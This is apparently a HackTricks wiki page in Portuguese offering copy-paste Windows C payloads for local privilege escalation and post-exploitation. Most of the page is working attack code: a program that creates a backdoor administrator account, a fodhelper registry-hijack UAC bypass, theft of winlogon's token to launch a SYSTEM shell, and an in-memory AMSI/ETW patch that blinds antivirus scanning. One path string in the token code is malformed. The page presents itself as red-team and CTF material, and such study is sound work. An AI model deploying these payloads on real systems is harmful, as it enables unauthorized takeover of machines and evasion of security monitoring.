# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Esta página coleta **pequenos trechos de C autônomos** que são úteis durante a Escalação de Privilégios Locais no Windows ou pós-exploração. Cada payload é projetado para ser **amigável ao copiar e colar**, requer apenas a API do Windows / tempo de execução C, e pode ser compilado com `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Esses payloads assumem que o processo já possui os privilégios mínimos necessários para realizar a ação (por exemplo, `SeDebugPrivilege`, `SeImpersonatePrivilege` ou contexto de integridade média para um bypass de UAC). Eles são destinados a **configurações de red-team ou CTF** onde explorar uma vulnerabilidade resultou na execução de código nativo arbitrário.

---

## Adicionar usuário administrador local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registro Hijack (Integridade Média → Alta)
Quando o binário confiável **`fodhelper.exe`** é executado, ele consulta o caminho do registro abaixo **sem filtrar o verbo `DelegateExecute`**. Plantando nosso comando sob essa chave, um atacante pode contornar o UAC *sem* gravar um arquivo no disco.

*Caminho do registro consultado por `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Um PoC mínimo que abre um `cmd.exe` elevado:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testado no Windows 10 22H2 e Windows 11 23H2 (patches de julho de 2025). O bypass ainda funciona porque a Microsoft não corrigiu a verificação de integridade ausente no caminho `DelegateExecute`.*

---

## Criar shell SYSTEM via duplicação de token (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Se o processo atual possui **ambos** os privilégios `SeDebug` e `SeImpersonate` (típico para muitas contas de serviço), você pode roubar o token de `winlogon.exe`, duplicá-lo e iniciar um processo elevado:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Para uma explicação mais profunda de como isso funciona, veja:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch AMSI & ETW em Memória (Evasão de Defesa)
A maioria dos motores AV/EDR modernos depende de **AMSI** e **ETW** para inspecionar comportamentos maliciosos. Fazer patch em ambas as interfaces cedo dentro do processo atual impede que payloads baseados em script (por exemplo, PowerShell, JScript) sejam escaneados.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*O patch acima é local ao processo; iniciar um novo PowerShell após executá-lo será feito sem inspeção AMSI/ETW.*

---

## Referências
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
